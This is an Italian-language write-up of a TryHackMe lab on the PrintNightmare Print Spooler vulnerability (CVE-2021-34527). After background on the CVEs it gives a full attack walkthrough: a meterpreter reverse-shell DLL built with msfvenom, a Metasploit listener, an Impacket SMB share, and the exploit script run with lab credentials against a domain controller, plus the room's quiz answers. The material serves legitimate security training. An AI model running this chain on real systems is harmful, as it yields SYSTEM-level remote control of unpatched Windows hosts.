
#tryhackmelabs #laboratorio #stampante

https://tryhackme.com/room/printnightmarehpzqlp8

In questa sala verrà affrontata la vulnerabilità Printnightmare da una prospettiva offensiva e difensiva.

Secondo Microsoft, " _Esiste una vulnerabilità di esecuzione di codice remoto quando il servizio Windows Print Spooler esegue in modo improprio operazioni di file privilegiate. Un aggressore che sfruttasse con successo questa vulnerabilità potrebbe eseguire codice arbitrario con privilegi di SISTEMA. Un aggressore potrebbe quindi installare programmi; visualizzare, modificare o eliminare dati; o creare nuovi account con diritti utente completi_ ".

**Obiettivi di apprendimento:** in questa stanza, imparerai cos'è la vulnerabilità PrintNightmare, come sfruttarla e mitigarla. Imparerai anche i meccanismi di rilevamento usando Windows Event Logs e Wireshark. 

**Risultato:** di conseguenza, sarai pronto a difendere la tua organizzazioneda qualsiasi potenziale attacco PrintNightmare.

#### Servizio spooler di stampa di Windows

Microsoft definisce il  [servizio Spooler di stampa](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-prsod/7262f540-dd18-46a3-b645-8ea9b59753dc)  come un servizio che viene eseguito su ogni sistema informatico. Come puoi intuire dal nome, il servizio Spooler di stampa gestisce i processi di stampa. Le responsabilità dello Spooler di stampa sono  la gestione dei lavori di stampa,  la ricezione dei file da stampare, la loro messa in coda e la pianificazione.

È possibile avviare/arrestare/mettere in pausa/riprendere il servizio Spooler di stampa semplicemente accedendo ai **Servizi** sul sistema Windows.

**Proprietà dello spooler di stampa (servizi)** :

Il servizio spooler di stampa assicura di fornire risorse sufficienti ai computer che inviano i lavori di stampa. Ricordi i primi tempi in cui gli utenti dovevano aspettare che i lavori di stampa terminassero per eseguire altre operazioni? Bene, il servizio spooler di stampa si è occupato di questo problema per noi. 

Il servizio Spooler di stampa consente ai sistemi di agire come client di stampa, client amministrativi o server di stampa. È anche importante notare che il servizio Spooler di stampa è abilitato per impostazione predefinita in tutti i client e server Windows. È necessario avere un servizio Spooler di stampa sul computer per connettersi a una stampante. Esistono software e driver di terze parti forniti dai produttori di stampanti che non richiedono di avere il servizio Spooler di stampa abilitato. Tuttavia, la maggior parte delle aziende preferisce utilizzare  i servizi Spooler di stampa. 

I Domain Controller utilizzano principalmente  il servizio Print spooler  per il pruning delle stampanti (il processo di rimozione delle stampanti che non sono più in uso sulla rete e sono state aggiunte come oggetti ad Active Directory). Il pruning delle stampanti elimina il problema per gli utenti che devono contattare una stampante inesistente. Presto saprai perché abbiamo menzionato i Domain Controller.

Dove abiliteresti o disabiliteresti il ​​servizio Spooler di stampa?
```
Services
```

#### Vulnerabilità di esecuzione di codice remoto

Per comprendere meglio la vulnerabilità PrintNightmare (o qualsiasi altra vulnerabilità), dovresti prendere l'abitudine di ricercare le vulnerabilità leggendo gli articoli Microsoft su qualsiasi CVE specifico di Windows o cercando su Internet i post dei blog della community e dei fornitori.

C'è stata un po' di confusione se  [CVE -2021-1675](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-1675) e [CVE -2021-34527](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-34527) siano correlate tra loro. Hanno lo stesso nome:  **Vulnerabilità di esecuzione di codice remoto di Windows Print Spooler** e sono entrambe correlate a **Print Spooler** . 

Come afferma [Microsoft](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-34527) nelle FAQ, la vulnerabilità PrintNightmare ( CVE -2021-34527) " _è simile ma distinta dalla vulnerabilità a cui è assegnata la CVE -2021-1675._  _Anche il vettore di attacco è diverso."_

Cosa intendeva Microsoft con il vettore di attacco? Per rispondere a questa domanda, esaminiamo le differenze tra le due vulnerabilità e aggiungiamo la cronologia degli eventi. 

Secondo la definizione [di Microsoft](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-34527)  , la vulnerabilità PrintNightmare è _"una vulnerabilità di esecuzione di codice remoto che esiste quando il servizio Windows Print Spooler esegue in modo improprio operazioni di file privilegiate. Un aggressore che sfruttasse con successo questa vulnerabilità potrebbe **eseguire codice arbitrario** con privilegi di SISTEMA. Un aggressore potrebbe quindi installare programmi; visualizzare, modificare o eliminare dati; o creare nuovi account con diritti utente completi"._

L'esecuzione di codice arbitrario implica l'esecuzione di qualsiasi comando scelto e preferito dall'attaccante sulla macchina di una vittima.  
Supponiamo di avere la possibilità di guardare entrambi i CVE su Microsoft. Noteresti che i vettori di attacco per entrambi sono diversi. 

Per sfruttare la vulnerabilità CVE -2021-1675, l'attaccante dovrebbe avere accesso diretto o locale alla macchina per usare un file DLL dannoso per aumentare i privilegi. Per sfruttare con successo la vulnerabilità CVE -2021-34527, l'attaccante può iniettare da remoto il file DLL dannoso . 

Metriche di vulnerabilità per CVE -2021-1675:

8 giugno 2021: Microsoft ha rilasciato una patch per una vulnerabilità di escalation dei privilegi nel servizio spooler di stampa ( CVE -2021-1675).

21 giugno 2021: Microsoft ha rivisto la vulnerabilità e ne ha modificato la classificazione in esecuzione di codice remoto ( RCE ).

27 giugno 2021: l'azienda cinese di sicurezza informatica QiAnXin [ha pubblicato un video](https://twitter.com/RedDrip7/status/1409353110187757575) che dimostra l'escalation dei privilegi locali (LPE) e l'RCE .

2 luglio 2021: Microsoft assegna una nuova vulnerabilità CVE denominata PrintNightmare nel servizio spooler di stampa ( CVE -2021-34527).

6 luglio 2021: Microsoft ha rilasciato una patch fuori banda (una patch rilasciata in un momento diverso dal normale) per risolvere il problema CVE -2021-34527 e fornisce soluzioni alternative aggiuntive per difendersi dall'exploit.

**Cosa rende PrintNightmare pericoloso?** 

1. Può essere sfruttato tramite la rete: l'aggressore non ha bisogno di accedere direttamente alla macchina.
2. La [dimostrazione pratica](https://github.com/cube0x0/CVE-2021-1675) è stata resa pubblica su Internet.
3. Il servizio Spooler di stampa è abilitato PER DEFAULT sui controller di dominio e sui computer con privilegi di SISTEMA.

Fornire il CVE della  vulnerabilità relativa all'esecuzione di codice remoto nello spooler di stampa di Windows che non richiede l'accesso locale alla macchina.
```
CVE-2021-34527
```
Quale data è stata assegnata al CVE per la vulnerabilità nella domanda precedente? (mm/gg/aaaa)
```
07/02/2021
```

#### Provalo tu stesso!

Per capire come funziona l'attacco e quali log ed eventi vengono generati, devi attivare il Black Hat ed eseguire l'attacco da solo. Ma, ovviamente, è necessario il permesso della dirigenza per eseguire questo attacco nell'ambiente del tuo datore di lavoro, anche se si tratta di un ambiente isolato.

Non preoccuparti, puoi eseguire l'attacco sulla macchina virtuale collegata e non nell'ambiente del tuo datore di lavoro. 

Avvia la macchina virtuale collegata. Dopo alcuni minuti, l'IP della tua macchina dovrebbe essere: MACHINE_IP 

---

Per sfruttare il Domain Controller tramite Attack Box sfruttando la vulnerabilità PrintNightmare, seguire i passaggi descritti di seguito. 

Nell'esempio di output del terminale riportato di seguito, la vittima è`MACHINE_IP` e  l'aggressore è `192.168.0.100`. 

**Nota:** come abbonato, avvia Attack Box se non l'hai ancora fatto prima di procedere. Come utente gratuito, questa attività dovrebbe essere completata sulla tua macchina di attacco locale.

Prima di procedere, crea 2 directory sul Desktop:

- `pn`- questo conterrà l'exploit.
- `share`- questa directory ( **/root/Desktop/share** ) conterrà la DLL dannosa che verrà creata con msfvenom.   
    

```
cd /home/kali/Downloads/THM
```
```
mkdir pn
```
```
mkdir share
```

Scarica **CVE -2021-1675.py** :

CloneCVE-2021-1675 exploit da GitHub

```
cd pn
```

```
git clone https://github.com/tryhackme/CVE-2021-1675.git
```

```shell-session
root@attackbox:~/Desktop/pn# git clone https://github.com/tryhackme/CVE-2021-1675.git 
Cloning into 'CVE-2021-1675'...
remote: Enumerating objects: 173, done.
remote: Counting objects: 100% (173/173), done.
remote: Compressing objects: 100% (105/105), done.
remote: Total 173 (delta 62), reused 133 (delta 36), pack-reused 0
Receiving objects: 100% (173/173), 1.45 MiB | 452.00 KiB/s, done.
Resolving deltas: 100% (62/62), done.
```

Prima di avviare **Metasploit** , crea la DLL dannosa .   

Nota : negli output del terminale qui sotto l'attaccante è  `192.168.0.100`. Dovrai sostituire `192.168.0.100`con il tuo IP ATTACK BOX (o IP OpenVPN) .  

Utilizzerai **msfvenom** per creare la DLL dannosa . 

Crea dannosoDLLcon Msfvenom

```
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.105.71 LPORT=4444 -f dll -o /home/kali/Downloads/THM/share/malicious.dll
```

```shell-session
root@attackbox:~/Desktop/pn# msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.0.100 LPORT=4444 -f dll -o ~/Desktop/share/malicious.dll 
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 510 bytes
Final size of dll file: 5120 bytes
Saved as: /root/Desktop/share/malicious.dll
```

Se vedi un output simile quando esegui questo comando, allora dovresti aver creato correttamente la DLL .

Avviamo Metasploit .

```
msfconsole
```

```shell-session
root@attackbox:~/Desktop/pn# msfconsole 
=[ metasploit v5.0.101-dev                         ]
+ -- --=[ 2048 exploits - 1105 auxiliary - 344 post       ]
+ -- --=[ 562 payloads - 45 encoders - 10 nops            ]
+ -- --=[ 7 evasion                                       ]

Metasploit tip: To save all commands executed since start up to a file, use the makerc command

msf5 >
```

Una volta caricato correttamente Metasploit , è necessario configurare il gestore per ricevere la connessione in arrivo dalla DLL dannosa . 

Esegui le seguenti opzioni di comando:

```
use exploit/multi/handler
```
```
set payload windows/x64/meterpreter/reverse_tcp
```
```
set lhost 10.14.99.134
```
```
set lport 4444
```

**Nota** : i valori per **LHOST** e **LPORT** devono essere gli stessi utilizzati per creare la DLL dannosa . 

Configura unMetasfruttamentoascoltatore

```shell-session
msf5 > use exploit/multi/handler 
[*] Using configured payload generic/shell_reverse_tcp
msf5 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp
payload => windows/x64/meterpreter/reverse_tcp
msf5 exploit(multi/handler) > set lhost 192.168.0.100
lhost => 192.168.0.100 msf5 exploit(multi/handler) > set lport 4444
lport => 4444
msf5 exploit(multi/handler) >
```

Quindi, eseguilo in modo che sia attivamente in attesa di una connessione. 

Avvia l'ascoltatore per accettare le connessioni in arrivo

```shell-session
msf5 exploit(multi/handler) > run -j 
[*] Exploit running as background job 0.
[*] Exploit completed, but no session was created.

[*] Started reverse TCP on 192.168.0.100:4444
```

Significa  `-j` semplicemente eseguirlo come un lavoro. 

```
run -j
```
Controllare metasploit del jobs

```
jobs
```

```shell-session
msf5 exploit(multi/handler) > jobs

Jobs
====

  Id  Name                    Payload                              Payload opts
  --  ----                    -------                              ------------
  0   Exploit: multi/handler  windows/x64/meterpreter/reverse_tcp  tcp://192.168.0.100:4444

msf5 exploit(multi/handler) >
```

Ottimo, ora dovrai ospitare la DLL dannosa in una condivisione SMB in esecuzione sulla casella dell'attaccante. In questo esempio useremo **AttackBox .**

Di seguito viene spiegato come fare con **smbserver.py** di **Impacket** .

```
sudo apt install python3-impacket
```

```
locate smbserver.py
```

```
sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py share /home/kali/Downloads/THM/share/ -smb2support
```

```shell-session
root@attackbox:~/Desktop/pn# smbserver.py share /root/Desktop/share/ -smb2support 
Impacket v0.9.24.dev1+20210814.5640.358fc7c6 - Copyright 2021 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
```

Una breve spiegazione del comando nell'immagine sopra:

1. Questo è il nome della condivisione SMB per l'esecuzione dell'exploit. (Esempio: **\\ATTACKER_IP\share\malicious. dll** )
2. Questa è la cartella locale in cui verrà archiviata la DLL dannosa . (Esempio: **/root/Desktop/share/malicious. dll** )

Prima di eseguire alla cieca un exploit sul bersaglio, verifichiamo se il bersaglio soddisfa i criteri per sfruttarlo.

Controlla se il target è vulnerabile a questo exploit

```
python3 /usr/share/doc/python3-impacket/examples/rpcdump.py @10.10.105.71 | egrep 'MS-RPRN|MS-PAR'
```

```shell-session
root@attackbox:~/Desktop/pn# rpcdump.py @MACHINE_IP | egrep 'MS-RPRN|MS-PAR' 
Protocol: [MS-RPRN]: Print System Remote Protocol 
Protocol: [MS-PAR]: Print System Asynchronous Remote Protocol
```

Sì, sembra buono.  È finalmente giunto il momento di eseguire l'exploit. Vai alla posizione in cui hai scaricato il codice exploit da GitHub, che dovrebbe essere `/root/Desktop/pn/CVE-2021-1675`. 
```
cd CVE-2021-1675
```
Utilizzeremo lo script Python per sfruttare la vulnerabilità PrintNightmare sul controller di dominio Windows 2019.

Sintassi del codice exploit
```
python3 CVE-2021-1675.py Finance-01.THMdepartment.local/sjohnston:mindheartbeauty76@10.10.105.71 '\\10.14.99.134\share\malicious.dll'
```
```shell-session
root@attackbox:~/Desktop/pn/CVE-2021-1675# python3.9 CVE-2021-1675.py Finance-01.THMdepartment.local/sjohnston:mindheartbeauty76@MACHINE_IP '\\192.168.0.100\share\malicious.dll'
```

Una breve spiegazione del comando nell'immagine sopra:

- **python3.9 CVE -2021-1675.py** -> stai istruendo Python a eseguire il seguente script Python. I valori che seguono sono i parametri di cui lo script ha bisogno per sfruttare con successo la vulnerabilità PrintNightmare.
- **Finance-01.THMdepartment.local** -> il nome del controller di dominio ( **Finance-01** ) insieme al nome del dominio ( **THMdepartment.local** )
- **sjohnston:mindheartbeauty76@MACHINE_IP**  -> nome utente e password per l'account utente Windows con privilegi bassi.   
    
- **\\ATTACKER_IP_ADDRESS\share\malicious. dll** -> posizione del percorso SMB in cui è archiviata la DLL dannosa . 

Se tutto va bene, dovresti vedere un output simile all'immagine qui sotto.

Esegui l'exploit

```shell-session
root@attackbox:~/Desktop/pn/CVE-2021-1675# python3.9 CVE-2021-1675.py Finance-01.THMdepartment.local/sjohnston:mindheartbeauty76@MACHINE_IP '\\192.168.0.100\share\malicious.dll'
[*] Connecting to ncacn_np:MACHINE_IP[\PIPE\spoolss]
[+] Bind OK
[+] pDriverPath Found C:\Windows\System32\DriverStore\FileRepository\ntprint.inf_amd64_83aa9aebf5dffc96\Amd64\UNIDRV.DLL
[*] Executing \??\UNC\192.168.0.100\share\malicious.dll
[*] Try 1...
[*] Stage0: 0
[*] Try 2...
[*] Stage0: 0
[*] Try 3...
[*] Stage0: 0
```

Potresti riscontrare **degli** errori Python dopo **il tentativo 3...** ma puoi tranquillamente ignorarli.

Sulla casella dell'attaccante dovresti vedere la connessione SMB che richiama il file DLL dannoso .  

La vittima si collega alPMIcondividere per i malintenzionatiDLL

```shell-session
root@attackbox:~/Desktop/pn# ...
[*] Incoming connection (MACHINE_IP,55037)
[*] AUTHENTICATE_MESSAGE (\,FINANCE-01)
[*] User FINANCE-01\ authenticated successfully
[*] :::00::aaaaaaaaaaaaaaaa
[*] Connecting Share(1:IPC$)
[*] Connecting Share(2:share)
[*] Disconnecting Share(1:IPC$)
[*] Disconnecting Share(2:share)
[*] Closing down connection (10.10.210.90,55037)
[*] Remaining connections []
```

Infine, la tua sessione Meterpreter sarà un successo . 

Connessione in arrivo ricevuta

```shell-session
msf5 exploit(multi/handler) > [*] Sending stage (201283 bytes) to 10.10.105.71 [*] Meterpreter session 1 opened (192.168.0.100:4444 -> 10.10.105.71:55038) at 2021-08-17 17:56:31 +0100
```


```
search -f flag.txt
```

```
meterpreter > cat 'c:\Users\Administrator\Desktop\flag.txt'
THM{xxxxxxxxxxxx}
```

WriteUP parte Blue Team
https://tryhackme.com/room/printnightmarehpzqlp8

